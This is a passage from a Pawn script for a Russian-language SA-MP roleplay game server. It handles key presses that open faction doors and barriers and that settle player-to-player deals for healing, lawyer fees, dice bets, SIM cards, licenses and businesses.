		callcmd::inv(playerid);
	}
	if(newkeys == KEY_WALK)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 894.0994,2096.5471,2721.8101))
		{
			if(IsACop(playerid))
  			{
 	 			switch(SDvers[0])
			    {
					case 0:
					{
						MoveObject(Dvers[0],894.250000,2098.961181,2720.793945,0.5,0.0000, 0.0000, -90.0000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						//SetPlayerChatBubble(playerid,"{00FF00}Открывает дверь",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[0] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[0], 894.25, 2097.70, 2720.79+0.004,0.5,0.0000, 0.0000, -90.0000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						//SetPlayerChatBubble(playerid,"{FE2E2E}Закрывает дверь",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[0] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 881.2035,2097.1069,2721.8101))//Оружейка
		{
		    if(IsACop(playerid))
		    {
				switch(SDvers[1])
				{
					case 0:
					{
						MoveObject(Dvers[1], 881.162841,2095.150341,2720.778320,0.5,0.000000,0.000000,89.999908);//о
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						//SetPlayerChatBubble(playerid,"{00FF00}Открывает дверь",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[1] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[1], 881.162841,2096.350341,2720.778320,0.5,0.000000,0.000000,89.999908);//з
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						//SetPlayerChatBubble(playerid,"{FE2E2E}Закрывает дверь",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[1] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 8.0, -222.6173,569.1437,12.6425))
		{
  			if(PI[playerid][pMember] == TEAM_POLICIA2)
		    {
				switch(SDvers[7])
				{
					case 0:
					{
						MoveObject(Dvers[9], -219.3915, 569.2380, 12.3261,0.5,0.000000,0.000000,-6.000000);//о
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						SetPlayerChatBubble(playerid,"{00FF00}Открывает шлагбаум",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[7] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[9], -219.3915, 569.2380, 12.3261,0.5,0.000000,-90.000000,-6.000000);//з
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						SetPlayerChatBubble(playerid,"{FE2E2E}Закрывает шлагбаум",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[7] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 8.0, -298.5464,543.1221,12.5158))//Медики
		{
  			if(PI[playerid][pMember] == TEAM_POLICIA2)
		    {
				switch(SDvers[8])
				{
					case 0:
					{
						MoveObject(Dvers[10], -299.3062, 540.3217, 12.2217,0.5,0.000000,0.000000,-96.000000);//o
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						SetPlayerChatBubble(playerid,"{00FF00}Открывает шлагбаум",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[8] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[10], -299.3062, 540.3217, 12.2217,0.5,0.000000,-90.000000,-96.000000);//з
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						SetPlayerChatBubble(playerid,"{FE2E2E}Закрывает шлагбаум",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[8] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, -228.7113,700.9940,1002.0000)) // в поле
		{
			if(PI[playerid][pMember] == TEAM_FBI)
			{
				switch(SDvers[3])
				{
					case 0:
					{
						MoveObject(Dvers[3], -228.7682, 701.7680, 1001.0000+0.004,2.0,0.0000, 0.0000, 0.0000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						//SetPlayerChatBubble(playerid,"{00FF00}Открывает ворота",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[3] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[3], -228.7682, 701.7680, 1001.0000+0.004,2.0,0.0000, 0.0000, -90.0000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						//SetPlayerChatBubble(playerid,"{FE2E2E}Закрывает ворота",-1,30.0,10000);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[3] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, -222.4848,696.1696,1002.0000))
		{
		    if(PI[playerid][pMember] == TEAM_FBI)
			{
				switch(SDvers[5])
				{
					case 0:
					{
						MoveObject(Dvers[6], -223.1524, 696.1800, 1001.0000,2.0,0.0000, 0.0000, -90.0000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[5] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[6], -223.1524, 696.1800, 1001.0000,2.0,0.0000, 0.0000, 0.0000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[5] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 590.9053,2801.8093,1253.9659))
		{
		    if(IsACop(playerid) || IsAMayor(playerid))
			{
				switch(SDvers[6])
				{
					case 0:
					{
						MoveObject(Dvers[7], 589.34, 2782.04, 1257.25,2.0,0.0000, 0.0000, -90.00);
						MoveObject(Dvers[8], 589.32, 2785.40, 1257.25,2.0,0.0000, 0.0000, -90.00);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[6] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[7], 589.34, 2782.04, 1254.25,2.0,0.0000, 0.0000, -90.00);
						MoveObject(Dvers[8], 589.32, 2785.40, 1254.25,2.0,0.0000, 0.0000, -90.00);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[6] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 597.2094, 2.2534, 1021.8394))
		{
      		if(PI[playerid][pMember] == TEAM_POLICIA)
		    {
				switch(SDvers[10])
				{
					case 0:
					{
						MoveObject(Dvers[12], 597.2094, 2.2534, 1021.8394,0.5,0.000000,0.000000,0.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[10] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[12], 597.2094, 2.2534, 1021.8394,0.5,0.000000,0.000000,-90.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[10] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 8.0, 1817.8142,2128.9861,15.8399))
		{
		    if(IsACop(playerid) || PI[playerid][pMember] == TEAM_MERIA)
		    {
				switch(SDvers[11])
				{
					case 0:
					{
						MoveObject(Dvers[13], 1817.60, 2132.48, 15.59, 2.0, 0.00, 0.00, 90.00);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[11] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[13], 1817.60, 2132.48, 15.59, 2.0, 0.00, -90.00, 90.00);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[11] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 444.4124, -82.6182, 3000.9900)) // в поле
		{
		    if(IsACop(playerid) || PI[playerid][pMember] == TEAM_POLICIA2)
		    {
				switch(SDvers[13])
				{
					case 0:
					{
						MoveObject(Dvers[14], 444.4124, -82.6182, 3000.9900,0.5,0.000000,0.000000,-90.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[13] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[14], 444.4124, -82.6182, 3000.9900,0.5,0.000000,0.000000,0.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[13] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, -228.9312, 709.6014, 1001.0000))
		{
		    if(PI[playerid][pMember] == TEAM_FBI)
		    {
				switch(SDvers[14])
				{
					case 0:
					{
						MoveObject(Dvers[15], -228.9312, 709.6014, 1001.0000,0.5,0.000000,0.000000,-90.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[14] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[15], -228.9312, 709.6014, 1001.0000,0.5,0.000000,0.000000,180.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[14] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, -2464.1699, -2314.8899, 1001.0000))
		{
		    if(PI[playerid][pMember] == TEAM_FBI)
		    {
				switch(SDvers[15])
				{
					case 0:
					{
						MoveObject(Dvers[16], -2464.1699, -2314.8899, 1001.0000,0.5,0.000000,0.000000,-90.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[15] = 1;
					}
					case 1:
					{
						MoveObject(Dvers[16], -2464.1699, -2314.8899, 1001.0000,0.5,0.000000,0.000000,0.000000);
						ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.0,0,0,0,0,0);
						PlayerPlaySound(playerid, 1190, 0.0, 0.0, 0.0);
						SDvers[15] = 0;
					}
				}
			}
			return true;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, -221.4251,696.6162,1002.0000))
		{
			if(IsACop(playerid))
			{
				switch(door_inter_swat_status)
				{
					case 0:
					{
						MoveDynamicObject(door_inter_swat, -223.1800, 696.1600, 1001.0000, 2.0, 0.0000, 0.0000, -76.3799);
						SendClientMessage(playerid, C_OSNOV, "Вы открыли дверь");
						SetPlayerChatBubble(playerid,"Открывает дверь", C_OSNOV, 30.0, 10000);
						door_inter_swat_status = 1;
					}
					case 1:
					{
						MoveDynamicObject(door_inter_swat, -223.17999, 696.15997, 1001.00000, 2.0, 0.0000, 0.0000, 0.0000);
						SendClientMessage(playerid, C_RED, "Вы закрыли дверь");
						SetPlayerChatBubble(playerid,"Закрывает дверь", C_RED, 30.0, 10000);
						door_inter_swat_status = 0;
					}
				}
			}
		}
	}
	if(newkeys == KEY_YES) // Y
	{
	    if(GetPVarInt(playerid, "KeyHeal") == 1)
	    {
   			new targetid = GetPVarInt(playerid, "PlayerHeal"), price = GetPVarInt(playerid, "MoneyHeal");
			if(GetMoney(playerid) < price)
			{
				SendMes(targetid, COLOR_GREY, "У игрока %s недостаточно средств!", GetName(playerid));
				DeletePVar(playerid, "PlayerHeal");
				DeletePVar(playerid, "MoneyHeal");
				DeletePVar(playerid, "KeyHeal");
				return SendMess(playerid, MSG_NOT_MONEY);
			}
			if(IsPlayerInAnyVehicle(targetid) && !IsPlayerInVehicle(playerid, GetPlayerVehicleID(targetid)))
				return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться вместе с вами в машине!");
			GiveMoney(playerid, -price, "Личение");
			GiveMoney(targetid, price);
			PI[playerid][pHealthS] = PI[playerid][pHeal] = 100;
			SetHealth(playerid, 100);
			if(GetPlayerDrunkLevel(playerid) > 0) SetPlayerDrunkLevel(playerid, 0);
			SendMes(playerid, COLOR_GREEN, "%s %s вылечил Вас за %iр", Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]], GetName(targetid), price);
			SendMes(targetid, COLOR_GREEN, "Вы вылечили %s за %iр", GetName(playerid), price);

			STRING_GLOBAL[0] = EOS;
			if(PI[playerid][pSex] == 1) format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[MED] %s %s[%i] провёл курс лечения пациенту %s[%i] за %iр", Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]], GetName(targetid), targetid, GetName(playerid), playerid, price);
			else format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[MED] %s %s[%i] провела курс лечения пациенту %s[%i] за %iр", Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]], GetName(targetid), targetid, GetName(playerid), playerid, price);
			SendFMes(PI[targetid][pMember], COLOR_YELLOW, STRING_GLOBAL);
			if(Medicines[targetid]) Medicines[targetid]--;
			SendMes(targetid, COLOR_WHITE, "Количество комплектов медикаментов с собой: %i", Medicines[targetid]);
			DeletePVar(playerid, "PlayerHeal");
			DeletePVar(playerid, "MoneyHeal");
			DeletePVar(playerid, "KeyHeal");
	    	return 1;
  		}
  		else if(GetPVarInt(playerid, "KeyJail") == 1)
  		{
  		    new targetid = GetPVarInt(playerid, "JailPlayer"), price = GetPVarInt(playerid, "JailSumma");
			if(GetMoney(playerid) < price)
			{
				SendMes(targetid, COLOR_GREY, "У игрока %s недостаточно средств!", GetName(playerid));
				DeletePVar(playerid, "JailPlayer");
				DeletePVar(playerid, "JailSumma");
				DeletePVar(playerid, "JailReason");
				DeletePVar(playerid, "KeyJail");
				SendMess(playerid, MSG_NOT_MONEY);
				return 1;
			}

			GiveMoney(playerid, -price, "Оплата адвотка");
			GiveMoney(targetid, price, "ЗП за адвоката");

			SendMes(playerid, COLOR_GREEN, "Вы оплатили %iр адвокату %s", price, GetName(targetid));
			SendMes(targetid, COLOR_GREEN, "%s оплатил в размере %iр", GetName(playerid), price);
			DeletePVar(playerid, "JailPlayer");
			DeletePVar(playerid, "JailSumma");
			DeletePVar(playerid, "JailReason");
			DeletePVar(playerid, "KeyJail");
			PI[playerid][pJailTime] = 1;
			ResetPlayerWeapons(playerid);
			MysqlUpdatePlayerInt(playerid, "jail", PI[playerid][pJail]);
			MysqlUpdatePlayerInt(playerid, "jailtime", PI[playerid][pJailTime]);
  		    return 1;
  		}
  		if(KostiName[playerid] != INVALID_PLAYER_ID)
		{
    		new dice = random(5) + 2;
   			new dice1 = random(5) + 2;
			if(!ProxDetectorS(6.0, playerid, KostiName[playerid])) return SendClientMessage(playerid, COLOR_DARKORANGE, "Игрок не рядом с вами!");
			if(Predlog[playerid] != 0) return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы не можете принять игру!");
			new fiski = PI[playerid][pCash];
			new fiski1 = PI[KostiName[playerid]][pCash];
			if(fiski < KostiMoney[playerid] || fiski1 < KostiMoney[KostiName[playerid]])
			{
			    SendClientMessage(playerid, COLOR_DARKORANGE, "У игрока нет столько денег");
			    SendClientMessage(KostiName[playerid], COLOR_DARKORANGE, "У игрока нет столько денег");
			    callcmd::canceldice(playerid);
				callcmd::canceldice(KostiName[playerid]);
			    return 0;
			}
			new string[128];
	    	format(string, sizeof(string), "%s и %s бросили кости. Результат: {ffcc00}%i:%i", GetName(KostiName[playerid]), GetName(playerid), dice, dice1);
	    	ProxDetector(13.0, playerid, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    	if(dice > dice1)
	    	{
                GiveMoney(KostiName[playerid], KostiMoney[playerid], "Выигрыш казино");
				GiveMoney(playerid, -KostiMoney[playerid], "Проигрыш казино");
		        SendClientMessage(KostiName[playerid], COLOR_LIME, "Поздравляем! Вы выиграли!");
		        SendClientMessage(playerid, COLOR_DARKORANGE, "К сожалению, Вы проиграли!");
		        format(string, 20, "~g~+%d Рублей", KostiMoney[playerid]);
		        GameTextForPlayer(KostiName[playerid], string, 3000, 5);
		        format(string, 20, "~r~-%d Рублей", KostiMoney[playerid]);
		        GameTextForPlayer(playerid, string, 3000, 5);
		        PlayerPlaySound(playerid, 31202, 0.0, 0.0, 0.0);
		        PlayerPlaySound(KostiName[playerid], 1054, 0.0, 0.0, 0.0);
		    }
		    else if(dice < dice1)
		    {
          		GiveMoney(KostiName[playerid], -KostiMoney[playerid], "Проигрыш казино");
				GiveMoney(playerid, KostiMoney[playerid], "Выигрыш казино");
		        SendClientMessage(playerid, COLOR_LIME, "Поздравляем! Вы выиграли!");
		        SendClientMessage(KostiName[playerid], COLOR_DARKORANGE, "К сожелению, Вы проиграли");
		        format(string, 20, "~g~+%d Рублей", KostiMoney[playerid]);
		        GameTextForPlayer(playerid, string, 3000, 5);
		        format(string, 20, "~r~-%d Рублей", KostiMoney[playerid]);
		        GameTextForPlayer(KostiName[playerid], string, 3000, 5);
		        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
		        PlayerPlaySound(KostiName[playerid], 31202, 0.0, 0.0, 0.0);
		    }
		    else if(dice == dice1)
		    {
		        SendClientMessage(playerid, COLOR_ORANGE, "Игра закончилась в ничью!");
		        SendClientMessage(KostiName[playerid], COLOR_ORANGE, "Игра закончилась в ничью!");
		    }
			format(string, 14, "Выпало: %i", dice1);
			SetPlayerChatBubble(playerid, string, COLOR_BLUE, 30.0, 10000);
			format(string, 14, "Выпало: %i", dice);
			SetPlayerChatBubble(KostiName[playerid], string, COLOR_BLUE, 30.0, 10000);
		 	ZapretDice[playerid] = ZapretDice[KostiName[playerid]] = 0;
			KostiMoney[playerid] = KostiMoney[KostiName[playerid]] = 0;
			Predlog[KostiName[playerid]] = 0;
			KostiName[KostiName[playerid]] = KostiName[playerid] = INVALID_PLAYER_ID;
			return 1;
		}
		else if(GetPVarInt(playerid, "KeySim") == 1)
		{
			new targetid = GetPVarInt(playerid, "PlayerSim"), price = GetPVarInt(playerid, "SimPrice");
			if(GetMoney(playerid) < price)
			{
				SendMes(targetid, COLOR_GREY, "У игрока %s недостаточно средств!", GetName(playerid));
				DeletePVar(playerid, "PlayerSim");
				DeletePVar(playerid, "SimPrice");
				DeletePVar(playerid, "KeySim");
				SendMess(playerid, MSG_NOT_MONEY);
				return 1;
			}
			GiveMoney(playerid, -price, "Покупка симки");
			GiveMoney(targetid, price, "Продажа симки");

			SendMes(playerid, COLOR_GREEN, "Вы приобрели SIM-карту у %s за %iр", GetName(targetid), price);
			SendMes(targetid, COLOR_GREEN, "%s купил у Вас SIM-карту за %iр", GetName(playerid), price);
			PI[playerid][pPhoneNumber] = PI[targetid][pPhoneNumber];
			PI[targetid][pPhoneNumber] = 1;
			MysqlUpdatePlayerInt(playerid, "phonenumber", PI[playerid][pPhoneNumber]);
			MysqlUpdatePlayerInt(targetid, "phonenumber", PI[targetid][pPhoneNumber]);
			SendMes(playerid, COLOR_YELLOW, "Ваш новый номер: {FFFFFF}%i", PI[playerid][pPhoneNumber]);
			DeletePVar(playerid, "PlayerSim");
			DeletePVar(playerid, "SimPrice");
			DeletePVar(playerid, "KeySim");
  		    return 1;
		}
		else if(GetPVarInt(playerid, "sellexamlic") == 1)
		{
		    new targetid = GetPVarInt(playerid, "idselllic"), rcv = GetPVarInt(playerid, "changelic");
			new type[28], price;
			switch(rcv)
			{
			    case 1: price = 1000;
			    case 2: price = 3000;
			    case 3: price = 10000;
			    case 4: price = 30000;
			    case 5: price = 50000;
			}
			if(GetMoney(playerid) < price)
			{
				SendMes(targetid, COLOR_GREY, "У игрока %s недостаточно средств!", GetName(playerid));
				DeletePVar(playerid, "sellexamlic");
				DeletePVar(playerid, "idselllic");
				DeletePVar(playerid, "changelic");
				return SendMess(playerid, MSG_NOT_MONEY);
			}
			new Float:x, Float:y, Float:z;
			GetPlayerPos(targetid, x, y, z);
			if(!IsPlayerInRangeOfPoint(playerid, 10.0, x, y, z))
			{
				DeletePVar(playerid, "sellexamlic");
				DeletePVar(playerid, "idselllic");
				DeletePVar(playerid, "changelic");
				return SendClientMessage(playerid, COLOR_GREY, "Вы далеко друг от друга");
			}
			if(rcv == 1)
			{
				g_player_skills[playerid][S_LICS][0] = 1;
				type = "водительские права";
			}
			if(rcv == 2)
			{
				g_player_skills[playerid][S_LICS][1] = 1;
				type = "лицензию на судоходство";
			}
			if(rcv == 3)
			{
				g_player_skills[playerid][S_LICS][2] = 1;
				type = "лицензию на полеты";
			}
			if(rcv == 4)
			{
				g_player_skills[playerid][S_LICS][3] = 1;
				type = "лицензию на оружие";
			}

			SavePlayerSkills(playerid);

			GiveMoney(playerid, -price);
			GiveMoney(targetid, price);

			SendMes(playerid, COLOR_GREEN, "Вы купили %s у %s. Цена: %iр", type, GetName(playerid), price);
			SendMes(targetid, COLOR_GREEN, "Вы продали %s игроку %s за %iр", GetName(targetid), type, price);

			STRING_GLOBAL[0] = EOS;
			if(PI[playerid][pSex] == 1) format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[LIC] %s %s[%i] продал игроку %s[%i] за %iр", Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]], GetName(targetid), playerid, GetName(playerid), playerid, price);
			else format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[LIC] %s %s[%i] продала игроку %s[%i] за %iр", Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]], GetName(targetid), playerid, GetName(playerid), playerid, price);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW, STRING_GLOBAL);
			DeletePVar(playerid, "sellexamlic");
			DeletePVar(playerid, "idselllic");
			DeletePVar(playerid, "changelic");
		    return 1;
		}
		else if(GetPVarInt(playerid, "sellbiz") == 1) // продажа бизнеса игроку
		{ // playerid - покупатель, targetid - продавец
		    new targetid = GetPVarInt(playerid, "idsellplayerbiz");
			new bizzid = GetPVarInt(playerid, "bizzid");
			new price = GetPVarInt(playerid, "price_bizz");

			if(GetMoney(playerid) < price)
			{
				SendMes(targetid, COLOR_DARKORANGE, "У игрока %s недостаточно средств!", PI[playerid][pName]);
				DeletePVar(playerid, "sellbiz");
				DeletePVar(playerid, "idsellplayerbiz");
				DeletePVar(playerid, "bizzid");
				DeletePVar(playerid, "price_bizz");
				return SendMess(playerid, MSG_NOT_MONEY);
			}

			new Float:x, Float:y, Float:z;
			GetPlayerPos(targetid, x, y, z);
			if(!IsPlayerInRangeOfPoint(playerid, 10.0, x, y, z))
			{
                DeletePVar(playerid, "sellbiz");
				DeletePVar(playerid, "idsellplayerbiz");
				DeletePVar(playerid, "bizzid");
				DeletePVar(playerid, "price_bizz");
				return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы далеко друг от друга");
			}

	        strmid(BizzInfo[bizzid][bOwner], GetName(playerid), 0, MAX_PLAYER_NAME, MAX_PLAYER_NAME);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET owner = '%s' WHERE id = %d",
			PI[playerid][pName], bizzid);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			UpdateBizz(bizzid);

			GiveMoney(playerid, -price);
			GiveMoney(targetid, price);

			SendMes(playerid, COLOR_BLUE, "Поздравляем! {FFFFFF}%s {1D99D4}продал Вам свой бизнес за {FFCC00}%i {1D99D4}рублей", PI[targetid][pName], price);
			SendMes(targetid, COLOR_BLUE, "Вы продали бизнес игроку {FFFFFF}%s {1D99D4}за {FFCC00}%i {1D99D4}рублей", PI[targetid][pName], price);
			DeletePVar(playerid, "sellbiz");
			DeletePVar(playerid, "idsellplayerbiz");
			DeletePVar(playerid, "bizzid");
			DeletePVar(playerid, "price_bizz");
		    return 1;
		}
	}
	else if(newkeys == KEY_NO) // N
	{
	    if(GetPVarInt(playerid, "KeyHeal") == 1)
	    {
	        new targetid = GetPVarInt(playerid, "PlayerHeal");
	    	SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(targetid, COLOR_RED, "Игрок отказался от предложения");
			DeletePVar(playerid, "PlayerHeal");
			DeletePVar(playerid, "MoneyHeal");
			DeletePVar(playerid, "KeyHeal");
	    	return 1;
    	}
    	else if(GetPVarInt(playerid, "KeyZone") == 1)
    	{
    	    new targetid = GetPVarInt(playerid, "PlayerZone");
    	    SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(targetid, COLOR_RED, "Игрок отказался от предложения");
			DeletePVar(playerid, "PlayerZone");
			DeletePVar(playerid, "ZonePrice");
			DeletePVar(playerid, "ZoneID");
			DeletePVar(playerid, "KeyZone");
			return 1;
    	}
    	else if(GetPVarInt(playerid, "KeyCar") == 1)
    	{
    	    new targetid = GetPVarInt(playerid, "CarPlayer");
    	    SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(targetid, COLOR_RED, "Игрок отказался от предложения");
			DeletePVar(playerid, "CarPrice");
			DeletePVar(playerid, "CarPlayer");
			DeletePVar(playerid, "KeyCar");
    	    return 1;
		}
		else if(GetPVarInt(playerid, "KeyJail") == 1)
		{
		    new targetid = GetPVarInt(playerid, "JailPlayer");
		   	SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(targetid, COLOR_RED, "Игрок отказался от предложения");
		   	DeletePVar(playerid, "JailPlayer");
			DeletePVar(playerid, "JailSumma");
			DeletePVar(playerid, "JailReason");
			DeletePVar(playerid, "KeyJail");
		    return 1;
		}
		else if(KostiName[playerid] != INVALID_PLAYER_ID)
  		{
  		    SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(KostiName[playerid], COLOR_RED, "Игрок отказался от предложения");
  		    Predlog[playerid] = Predlog[KostiName[playerid]] =
			KostiMoney[playerid] = KostiMoney[KostiName[playerid]] =
			ZapretDice[playerid] = ZapretDice[KostiName[playerid]] = 0;
			KostiName[KostiName[playerid]] = KostiName[playerid] = INVALID_PLAYER_ID;
			return 1;
		}
		else if(GetPVarInt(playerid, "KeySim") == 1)
		{
			new targetid = GetPVarInt(playerid, "PlayerSim");
		   	SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(targetid, COLOR_RED, "Игрок отказался от предложения");
		   	DeletePVar(playerid, "PlayerSim");
			DeletePVar(playerid, "SimPrice");
			DeletePVar(playerid, "KeySim");
		    return 1;
		}
		if(GetPVarInt(playerid, "sellexamlic") == 1)
		{
			new targetid = GetPVarInt(playerid, "idselllic");
			SendClientMessage(playerid, COLOR_RED, "Вы отказались от предложения");
			SendClientMessage(targetid, COLOR_RED, "Игрок отказался от предложения");
			DeletePVar(playerid, "sellexamlic");
			DeletePVar(playerid, "idselllic");
			DeletePVar(playerid, "changelic");
			return 1;
		}
		else if(GetPVarInt(playerid, "sellbiz") == 1) // продажа бизнеса игроку
		{
            new targetid = GetPVarInt(playerid, "idsellplayerbiz");
			SendClientMessage(playerid, COLOR_BLUE, "Вы отказались от покупки бизнеса!");
			SendMes(targetid, COLOR_BLUE, "Игрок %s отказался от покупки Вашего бизнеса", PI[targetid][pName]);
			DeletePVar(playerid, "sellbiz");
			DeletePVar(playerid, "idsellplayerbiz");
			DeletePVar(playerid, "bizzid");
			DeletePVar(playerid, "price_bizz");
		    return 1;
		}
	}
	/*if(newkeys & KEY_SPRINT && newkeys & KEY_JUMP)//Банихоп
	{
		if(!IsPlayerInAnyVehicle(playerid) && times[playerid] == true)
		{
			times[playerid] = false;
			SetTimerEx("AntiBH",790,false,"i",playerid);
			return 1;
		}
	}*/
	if(PRESSED(KEY_SPRINT))
    {
        if(GetPVarInt(playerid, "Animation") == 1)
        {
        	ClearAnimations(playerid);
        	SetPlayerSpecialAction(playerid, 0);
        	ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
        	DeletePVar(playerid,"Animation");
        	TextDrawHideForPlayer(playerid, AnimDraw);
        	return 1;
        }

		if(PI[playerid][P_REALTOR_TYPE] != REALTOR_TYPE_NONE)
		{
			TogglePlayerSpectating(playerid, false);

			//FreezePlayer(playerid, 2000);

			SetPlayerPos(playerid, 1060.7051,1920.9979,3026.7639);
			SetPlayerFacingAngle(playerid, 180.0);

			new index = GetPVarInt(playerid, "PlayerBizz");

			SetPlayerInterior(playerid, BizzInfo[index][bInt]);
